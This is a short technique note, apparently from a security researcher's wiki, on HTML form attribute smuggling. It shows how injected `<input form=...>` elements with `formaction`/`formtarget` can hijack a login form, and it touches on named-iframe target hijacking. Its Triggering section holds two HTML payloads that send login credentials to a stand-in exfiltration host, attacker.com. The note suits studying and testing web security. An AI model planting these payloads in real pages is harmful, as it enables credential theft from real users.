---
title: Form attribute smuggling
slug: form-attribute-smuggling
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/dom-xss, technique/html-injection]
inbound: []
---

# Form attribute smuggling

## Pattern
`<input form="formId" name=x value=y>` placed **outside** `<form id=formId>`
is still submitted with that form. Smuggle attacker-controlled fields
into HTML-injection contexts.

Plus `formaction` + `formtarget` on the input overrides the parent form's
action + target on submit.

## Preconditions
- HTML injection sink anywhere on a page that contains a form.
- Sanitizer allows `<input>` (not just `<a>`/`<img>`).

## Detection
- Find pages with sensitive forms (login, payment, CSRF-protected actions).
- Look for HTML-injection sinks on the same DOM tree.

## Triggering

### Smuggle fields into another form
```html
<input form="loginForm" name="redirect_to" value="https://attacker.com/exfil">
```

### Override form action/target
```html
<input form="loginForm"
       formaction="https://attacker.com/exfil"
       formtarget="_blank"
       type="submit">
```
On submit (manual click or autofill helpers), credentials POST to attacker.

### Related primitive: form target = named iframe hijack
`<form target="frameName">` posts the response into a same-origin named
iframe instead of opening a tab. Combined with two attacker-controlled
iframes, the named one is hijackable when victim app does
`window.open(url, "frameName")`. Requires same-origin iframe with matching
name.

## Seen in the wild
- Critical Thinking Podcast Eps 62, 69.

## References
- Critical Thinking Podcast Eps 62, 69
- Related: [[csp-form-action-gap]]
